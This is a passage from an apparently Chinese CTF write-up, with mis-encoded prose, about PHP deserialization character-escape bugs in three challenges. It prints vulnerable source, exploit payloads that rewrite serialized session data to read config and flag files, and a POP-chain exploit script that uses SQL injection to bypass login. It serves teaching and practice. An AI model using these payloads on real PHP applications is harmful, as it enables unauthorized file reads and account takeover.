First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt; åœ¨profile.phpæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„å¯ä»¥è¯»æ–‡ä»¶çš„åœ°æ–¹$photo = base64_encode(file_get_contents($profile['photo']));ï¼Œå¹¶ä¸”$profileå˜é‡æ˜¯ç»è¿‡ååºåˆ—åŒ–çš„ã€‚é‚£ä¹ˆç°åœ¨çš„ç›®æ ‡å°±æ˜¯è¦æŠŠ$profile['photo']çš„å€¼æ›¿æ¢æˆconfig.phpï¼Œupdate.phpä¸­å¯ä»¥æ§åˆ¶$profileå˜é‡ã€‚ä¸»è¦æ˜¯ä¸‹é¢è¿™ä¸€æ®µä»£ç ï¼š 1234567$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile));echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; ä¼ å…¥äº†æ•°ç»„ä¸­è¿™å››ä¸ªå€¼ï¼Œç„¶åå°†æ•°ç»„åºåˆ—åŒ–åå¸¦å…¥userç±»ä¸­çš„update_profileæ–¹æ³•ä¸­ä»è€Œæ›´æ”¹è¡¨ä¿¡æ¯ã€‚ç„¶åæˆ‘ä»¬æŸ¥çœ‹å†…å®¹æ—¶ä¼šåœ¨profile.phpä¸­ååºåˆ—åŒ–åè¿”å›ç»™æˆ‘ä»¬è¦çœ‹çš„ä¿¡æ¯ã€‚å†å»çœ‹ä¸€ä¸‹update_profileå‡½æ•°ï¼š 1234567891011121314151617public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125;public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; è¿™æ˜¯ä¸€ä¸ªé˜²æ­¢sqlæ³¨å…¥çš„æ–¹æ³•ï¼Œå…¶ä¸­ä»–å°†ä¸Šé¢äº”ä¸ªsqlå…³é”®å­—æ›¿æ¢ä¸ºäº†hackerã€‚çœ‹èµ·æ¥æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†è¿™å´æ˜¯æˆ‘ä»¬æœ€é‡è¦çš„åˆ©ç”¨ç‚¹ã€‚ ä»»ä½•å…·æœ‰ä¸€å®šç»“æ„çš„æ•°æ®ï¼Œå¦‚æœç»è¿‡äº†æŸäº›å¤„ç†è€ŒæŠŠç»“æ„ä½“æœ¬èº«çš„ç»“æ„ç»™æ‰“ä¹±äº†ï¼Œåˆ™æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ã€‚ é¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸€ä¸ªæ­£å¸¸çš„$profileç»è¿‡åºåˆ—åŒ–åæ˜¯ä»€ä¹ˆæ ·å­ï¼š 1$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:5:&quot;ca01h&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125; æˆ‘ä»¬æ›´æ”¹çš„ä¿¡æ¯æ˜¯è¦ç»è¿‡åºåˆ—åŒ–å­˜å…¥æ•°æ®åº“çš„ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬åœ¨ä¿¡æ¯ä¸­å¡«å…¥äº†å…³é”®å­—ï¼Œæ¯”å¦‚ï¼š 1a:2:&#123;i:0;s:6:&quot;select&quot;;i:1;s:5:&quot;world&quot;;&#125; è¿™æ ·ä¼šæ›¿æ¢ä¸º 1a:2:&#123;i:0;s:6:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125; ååºåˆ—åŒ–ä¼šæ­£å¸¸æ‰§è¡Œï¼Œå› ä¸ºå­—ç¬¦æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœå¡«å…¥äº†whereã€‚ 1a:2:&#123;i:0;s:5:&quot;where&quot;;i:1;s:5:&quot;world&quot;;&#125; ä¼šæ›¿æ¢ä¸ºï¼š 1a:2:&#123;i:0;s:5:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125; è¿™æ ·å°±ä¼šå‘ç°ä¼šå‡ºé”™ï¼Œå› ä¸ºwhereæ˜¯äº”ä¸ªå­—ç¬¦ï¼Œè€Œhackeræ˜¯å…­ä¸ªï¼Œå¯¹äºå‡ºwhereä»¥å¤–çš„å…¶ä»–éƒ½æ˜¯å…­å­—ç¬¦ï¼Œæ‰€ä»¥åªæœ‰whereä¼šå‡ºé”™ï¼Œå› æ­¤è¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹ã€‚å½“æˆ‘ä»¬æŠŠhackerå¤šä½™çš„è¿™ä¸ªræ›¿æ¢æˆ&quot;;i:1;s:5:&quot;world&quot;;&#125;æ—¶ï¼Œ 1a:2:&#123;i:0;s:5:&quot;hacke&quot;;i:1;s:5:&quot;world&quot;;&#125;&quot;;i:1;s:5:&quot;world&quot;;&#125; phpååºåˆ—åŒ–æ—¶ä¼šå¿½ç•¥åé¢çš„éæ³•éƒ¨åˆ†&quot;;i:1;s:5:â€œworldâ€;}ï¼Œå¯ä»¥ååºåˆ—åŒ–æˆåŠŸã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¤šå†™å‡ ä¸ªwhereï¼Œè¿™æ ·åœ¨æ›¿æ¢æ—¶æ¯å¤šå‡ºçš„ä¸€ä¸ªrå°±ä¸ºæˆ‘ä»¬æ„é€ å­—ç¬¦ä¸²æä¾›ä¸€ä¸ªä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;åŠ åœ¨åé¢ç”¨æ¥è¯»config.phpæ–‡ä»¶ã€‚å…±34ä¸ªå­—ç¬¦ï¼Œå› æ­¤éœ€è¦åŠ 34çš„whereï¼Œæ‰€ä»¥æœ€åéœ€è¦è¾“å…¥çš„æ•°æ®ä¸ºï¼š 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; è¿™æ ·åœ¨ååºåˆ—åŒ–åå¤§æ¦‚å°±æ˜¯è¿™æƒ…å†µï¼š 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:5:&quot;ca01h&quot;;s:5:&quot;photo&quot;;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125; æ­¤æ—¶è¿™34ä¸ªå­—ç¬¦ä¼šåŒ…å«åœ¨204ä¸ªæ€»å­—ç¬¦å†…ã€‚ æ›¿æ¢ä¸ºhackeråï¼š 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:5:&quot;ca01h&quot;;s:5:&quot;photo&quot;;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125; å› ä¸ºhackeræ¯”whereå¤šä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æ­£å¥½å æ®äº†è¿™å¤šä½™çš„34ä¸ªå­—ç¬¦ï¼Œä½¿å¾—å…¶é€ƒé€¸äº†å‡ºæ¥ï¼Œä¾¿å¯ä»¥æˆåŠŸååºåˆ—åŒ–ã€‚ payloadæ„é€ æˆåŠŸäº†ï¼Œå†æ‰¾è¾“å…¥ç‚¹ã€‚ md5(Array()) = null sha1(Array()) = null ereg(pattern,Array()) = null preg_match(pattern,Array()) = false strcmp(Array(), â€œabcâ€) = null strpos(Array(),â€œabcâ€) = null strlen(Array()) = null ä¸‹é¢çš„è¿™ä¸ªpreg_mathå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ 12if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); å‚è€ƒ https://xz.aliyun.com/t/7570#toc-9 http://www.lin2zhen.top/index.php/archives/73/ [å®‰æ´µæ¯ 2019]easy_serialize_php è€ƒç‚¹ phpinfoä¿¡æ¯æœé›† PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ è§£é¢˜ ä¸Šæ¥å°±ç›´æ¥ä¸ªæºä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; å¾ˆå®¹æ˜“çœ‹åˆ°æœ‰ä¸€ä¸ªå˜é‡è¦†ç›–çš„æ¼æ´ï¼Œä½†æ˜¯è¿˜ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ï¼Œæ¥ç€å¾€ä¸‹çœ‹ã€‚ ä¼ å…¥f=phpinfoå¯ä»¥çœ‹åˆ°sometingï¼Œè¯•è¯•çœ‹ åœ¨æ¯ä¸ªphpæ–‡ä»¶å‰é¢éƒ½è‡ªåŠ¨åŒ…å«äº†d0g3_f1ag.phpï¼Œç›´æ¥è®¿é—®æ²¡æœ‰ä»»ä½•å›æ˜¾ã€‚ å½“$function=show_imageçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨file_get_contentså‡½æ•°è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶$userinfo['img']å‚æ•°ä¸ºd0g3_f1ga.phpå°±å¯ä»¥è¯»flagã€‚ ä½†æ˜¯å¦‚æœä¼ å…¥img_pathå‚æ•°çš„è¯ä¼šå…ˆå¯¹å…¶base64ç¼–ç ç„¶åsha1åŠ å¯†ï¼Œæ˜¯ä¸€ä¸ªä¸å¯é€†çš„æ“ä½œã€‚ é‚£ä¹ˆå†å»çœ‹å¦å¤–ä¸¤ä¸ªå‚æ•°functionå’Œuserï¼Œå…¶ä¸­userä¹Ÿæ˜¯ç¡¬ç¼–ç æ— æ³•åˆ©ç”¨ï¼Œåªèƒ½ä»functionå‚æ•°å…¥æ‰‹ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜è¦æ³¨æ„åˆ°æœ‰ä¸€ä¸ªfilterå‡½æ•°ç”¨äºè¿‡æ»¤phpã€flagã€php5ã€php4å’Œfl1gå…³é”®å­—ã€‚ ä»»ä½•å…·æœ‰ä¸€å®šç»“æ„çš„æ•°æ®ï¼Œå¦‚æœç»è¿‡äº†æŸäº›å¤„ç†è€ŒæŠŠç»“æ„ä½“æœ¬èº«çš„ç»“æ„ç»™æ‰“ä¹±äº†ï¼Œåˆ™æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ã€‚ é‚£ä¹ˆè¿™ä¸ªåœ°æ–¹å°±å¯ä»¥å¾ˆæ˜æ˜¾çš„ç”¨åˆ°ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„æ¼æ´ï¼Œç”¨äºè¦†ç›–$userinfo['img']å‚æ•°ä¸ºd0g3_f1ag.phpã€‚é¦–å…ˆçœ‹ä¸€ä¸‹ä¸€ä¸ªæ­£å¸¸çš„åºåˆ—åŒ–åçš„$_SESSIONæ˜¯ä»€ä¹ˆæ ·å­çš„ï¼š 12345php &gt; $_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;php &gt; $_SESSION[&quot;user&quot;] = &#x27;phpinfo&#x27;;php &gt; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);php &gt; print_r(serialize($_SESSION));a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:7:&quot;phpinfo&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; æˆ‘ä»¬è¦è¦†ç›–æ‰åºåˆ—åŒ–åçš„imgå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¦æ’å…¥s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;ï¼Œå³ 1a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:7:&quot;phpinfo&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–æ¼æ´æ¥è¦†ç›–$_SESSION[&quot;user&quot;]å’Œ$_SESSION[&quot;function&quot;]çš„å€¼ã€‚ å‡å¦‚æˆ‘ä»¬èµ‹å€¼$_SESSION[&quot;user&quot;]=flagflagflagflagflagflagï¼Œ$_SESSION[&quot;function&quot;]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;ï¼Œé‚£ä¹ˆåºåˆ—åŒ–å$serialize_infoä¸ºï¼š 1a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;&#125; è¿‡æ»¤ä¹‹åï¼Œ 1a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;&#125; å…¶ä¸­&quot;;s:8:&quot;function&quot;;s:59:&quot;aåˆšå¥½æ˜¯24ä¸ªå­—ç¬¦ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶åé¢çš„åºåˆ—åŒ–å†…å®¹ã€‚ æ‰€ä»¥æœ€ç»ˆçš„payloadä¸ºï¼š 1_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image å‚è€ƒ å®˜æ–¹writeup ADæ”»é˜²å®éªŒå®¤â€”â€”PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ [GYCTF2020]EasyThinking è€ƒç‚¹ POPé“¾æ„é€  PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ è§£é¢˜ ä¸‹è½½www.zipå®¡è®¡æºç  123456789101112131415161718&lt;?phprequire_once(&#x27;lib.php&#x27;);echo &#x27;&lt;html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;update&lt;/title&gt;&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;&lt;/html&gt;&#x27;;if ($_SESSION[&#x27;login&#x27;]!=1)&#123; echo &quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;;&#125;$users=new User();$users-&gt;update();if($_SESSION[&#x27;login&#x27;]===1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125;?&gt; update.phpé¡µé¢æç¤ºéœ€è¦ç™»å½•æ‰èƒ½è·å¾—flagã€‚ ä¸»è¦ä»£ç éƒ½åœ¨lib.phpä¸­ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹Userç±» 12345678910111213141516171819202122232425262728293031323334353637383940class User&#123; public $id; public $age=null; public $nickname=null; public function login() &#123; if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123; $mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;); if($this-&gt;id)&#123; $_SESSION[&#x27;id&#x27;]=$this-&gt;id; $_SESSION[&#x27;login&#x27;]=1; echo &quot;ä½ çš„IDæ˜¯&quot;.$_SESSION[&#x27;id&#x27;]; echo &quot;ä½ å¥½ï¼&quot;.$_SESSION[&#x27;token&#x27;]; echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;; return $this-&gt;id; &#125; &#125;&#125; public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]); //è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘ &#125; public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname))); &#125; public function __destruct()&#123; return file_get_contents($this-&gt;nickname);//å± &#125; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; &#125;&#125; loginå‡½æ•°ä¸­è°ƒç”¨dbCtrlç±»ä¸­çš„loginå‡½æ•°æ‰§è¡ŒSQLè¯­å¥ï¼Œupdateå‡½æ•°ä¸­æœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„åœ°æ–¹ï¼Œå‚æ•°æ˜¯getNewInfoå‡½æ•°çš„è¿”å›å€¼ã€‚ getNewInfoå‡½æ•°ä¸­ageå’Œnicknameå‚æ•°æ˜¯å¯æ§çš„ï¼Œä¼ ç»™äº†Infoç±» 123456789101112class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age&#x3D;$age; $this-&gt;nickname&#x3D;$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125; ç„¶åè¿˜è¦ç»è¿‡ä¸€æ¬¡safeå‡½æ•° 1234function safe($parm)&#123; $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;); return str_replace($array,&#x27;hacker&#x27;,$parm);&#125; æ›¿æ¢ä¹‹åæ”¹å˜äº†æ•°æ®çš„ç»“æ„ï¼Œç±»ä¼¼0CTF2016 piapiapiaè¿™é“é¢˜ï¼Œå¾ˆå¯èƒ½ä¼šå¼•å‘å­—ç¬¦é€ƒé€¸çš„æ¼æ´ã€‚ æ¥ç€çœ‹dbCtrlç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class dbCtrl&#123; public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;root&quot;; public $database=&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST[&#x27;username&#x27;]; $this-&gt;password=$_POST[&#x27;password&#x27;]; $this-&gt;token=$_SESSION[&#x27;token&#x27;]; &#125; public function login($sql) &#123; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token==&#x27;admin&#x27;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo(&#x27;å¯†ç é”™è¯¯ï¼&#x27;); return false; &#125; $_SESSION[&#x27;token&#x27;]=$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; //è¿˜æ²¡æ¥å¾—åŠå†™ &#125;&#125; æˆ‘ä»¬å¯ä»¥çŸ¥é“çš„ä¿¡æ¯: ç”¨æˆ·åå­˜åœ¨ï¼Œä¸”$this-&gt;passwordçš„md5çš„å€¼ä¸æ•°æ®åº“æŸ¥è¯¢ç”¨æˆ·å¯†ç ç›¸åŒã€‚ æˆ–è€…tokençš„å€¼ä¸ºadmin è¿™é‡Œæœ‰ç‚¹åƒ2019GXYCTFä¸­çš„babySqliï¼Œæ˜¯ä¸æ˜¯æˆ‘ä»¬æ§åˆ¶äº†sqlè¯­å¥ï¼Œä½¿ç”¨ select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=? $this-&gt;password=1(1çš„md5çš„å€¼ä¸ºc4ca4238a0b923820dcc509a6f75849b) å°±å¯ä»¥é€šè¿‡ç™»å½•å¯†ç çš„éªŒè¯ã€‚ æ¥ä¸‹æ¥æ„é€ POPé“¾ï¼Œå…ˆæ¥æ‰¾ä¸€ä¸‹__destructé­”æ³•æ–¹æ³•ï¼Œåœ¨UpdateHelperç±»ä¸­ 12345678910111213Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125; å‘ç°ä¼šæŠŠsqlç»™echoå‡ºæ¥ï¼Œå¦‚æœ$sql=new User()çš„è¯ï¼Œå°±ä¼šè§¦å‘Userå†…çš„__toString()é­”æœ¯æ–¹æ³•ï¼Œè¯¥é­”æœ¯æ–¹æ³•å†…è°ƒç”¨äº†$nicknameå±æ€§çš„update()æ–¹æ³•ã€‚è™½ç„¶dbCtrlå¯¹è±¡æ‹¥æœ‰update()æ–¹æ³•ï¼Œä½†æ˜¯$nicknameå®ä¾‹åŒ–æˆå¯¹è±¡æ²¡æ„ä¹‰ã€‚æ¥ç€çœ‹Infoç±» 123456789101112class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125; è¿™æ—¶æˆ‘ä»¬çœ‹åˆ°äº†Infoç±»å†…æœ‰__call()é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœè°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§ï¼Œ__call()æ–¹æ³•å°±ä¼šè§¦å‘ï¼Œæ­£å¥½Infoç±»æ²¡æœ‰update()æ–¹æ³•ï¼Œé‚£ä¹ˆå¦‚æœUserå†…çš„$nicknameå®ä¾‹åŒ–ä¸ºInfoå¯¹è±¡ï¼Œè°ƒç”¨ä¸å­˜åœ¨update()å°±ä¼šè§¦å‘è¿™ä¸ª__call()ï¼Œè¿™ä¸ª__call()é­”æœ¯æ–¹æ³•å°†Ctrlcaseçš„login()å‡½æ•°ç»“æœè¾“å‡ºå‡ºæ¥ã€‚ è¿™æ ·æˆ‘ä»¬åªéœ€è¦$CtrlCaseå˜é‡å®ä¾‹åŒ–ä¸ºdbCtrlç±»çš„å¯¹è±¡ï¼Œè¿™å¥è¯ç›¸å½“äºç›¸å½“äºdbCtrl::login($sql)ï¼Œè€Œä¸”å¯çŸ¥dbCtrl::login($sql)ä¸­çš„$sqlå‚æ•°ï¼Œå®é™…ä¸Šæ˜¯Userç±»ä¸­çš„$ageå˜é‡ä¼ å…¥çš„ï¼Œå‚æ•°å°±æ˜¯æˆ‘ä»¬æ§åˆ¶çš„äº†ã€‚ expï¼š 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass User&#123; public $age = null; public $nickname = null; public function __construct() &#123; $this-&gt;age = &#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;; $this-&gt;nickname = new Info(); &#125;&#125;class Info&#123; public $CtrlCase; public function __construct() &#123; $this-&gt;CtrlCase = new dbCtrl(); &#125;&#125;class UpdateHelper&#123; public $sql; public function __construct() &#123; $this-&gt;sql = new User(); &#125;&#125;class dbCtrl&#123; public $name = &quot;admin&quot;; public $password = &quot;1&quot;;&#125;$o = new UpdateHelper;echo serialize($o); åºåˆ—åŒ–çš„ç»“æœ 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where 